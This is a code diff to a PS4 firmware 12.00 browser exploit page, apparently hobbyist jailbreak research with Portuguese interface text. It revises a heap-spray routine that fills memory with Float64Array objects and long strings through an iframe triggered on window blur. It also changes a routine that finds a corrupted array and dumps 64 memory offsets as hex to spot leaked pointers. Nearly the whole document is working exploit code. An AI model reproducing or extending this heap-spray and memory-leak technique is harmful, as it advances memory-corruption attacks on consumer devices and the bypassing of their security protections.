@@ -2,19 +2,19 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Deep Dump - Leandro</title>
+    <title>PS4 Dirty Heap - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - Deep Memory Dump</h1>
+    <h1>PS4 12.00 - Dirty Heap (Sujando os Zeros)</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Janela 32)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe de Sucesso</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Varredura Profunda (0-31)</button>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Dirty Spray)</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (0-63)</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 12px;"></div>
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 11px;"></div>
 
     <div id="frame-container" style="margin-top: 20px;"></div>
 
@@ -26,13 +26,13 @@
 
         function prepareObjects() {
             controllers = [];
-            // Aumentamos o tamanho de cada array para 32 para poder logar mais offsets
+            // Usaremos Float64Array(64) para uma varredura ainda mais profunda
             for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(32); 
+                let arr = new Float64Array(64); 
                 arr[0] = i; 
                 controllers.push(arr);
             }
-            statusPai.innerText = "5000 Objetos (Tamanho 32) prontos.";
+            statusPai.innerText = "5000 Objetos (Tamanho 64) prontos.";
             statusPai.style.color = "blue";
             leakOutput.style.display = "none";
         }
@@ -55,12 +55,16 @@
                                 document.documentElement.webkitRequestFullscreen();
                             
                             window.onblur = function() {
-                                let spray = [];
-                                for(let i = 0; i < 8000; i++) {
-                                    // Spray continua com tamanho 10 para manter a colisão que funcionou
-                                    let p = new Float64Array(10).fill(${PATTERN});
-                                    spray.push(p);
+                                // DIRTY SPRAY
+                                // Criamos strings e arrays para deixar "rastro" na RAM
+                                let garbage = [];
+                                for(let i = 0; i < 5000; i++) {
+                                    // Strings longas costumam deixar ponteiros estáveis
+                                    garbage.push("A".repeat(128) + i); 
+                                    let p = new Float64Array(64).fill(${PATTERN});
+                                    garbage.push(p);
                                 }
+
                                 setTimeout(() => {
                                     document.open();
                                     document.write('<h1>FINALIZADO</h1>');
@@ -90,24 +94,22 @@
             if (corrupted) {
                 statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Corrupção no ID: " + corruptedIndex + "</span>";
                 leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ DEEP MEMORY DUMP ]</b><br><br>";
+                leakOutput.innerHTML = "<b>[ DIRTY DUMP 0-63 ]</b><br><br>";
 
-                // Agora logamos 32 posições (0 a 31)
-                for(let i = 0; i < 32; i++) {
+                for(let i = 0; i < 64; i++) {
                     const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
                     const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                     
-                    let isPointer = (hex !== "0000000000000000" && !hex.includes("414141") && hex !== "0000000000000000");
-                    let style = isPointer ? "color:#fff; background:#a00;" : "";
+                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
+                    let style = isInteresting ? "color:#fff; background:#a00;" : "";
                     
-                    // Adiciona uma quebra de linha a cada 4 offsets para facilitar a leitura
                     let br = (i % 4 === 3) ? "<br>" : "";
-                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
+                    leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada. Tente novamente.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada.</span>";
             }
         }
     </script>
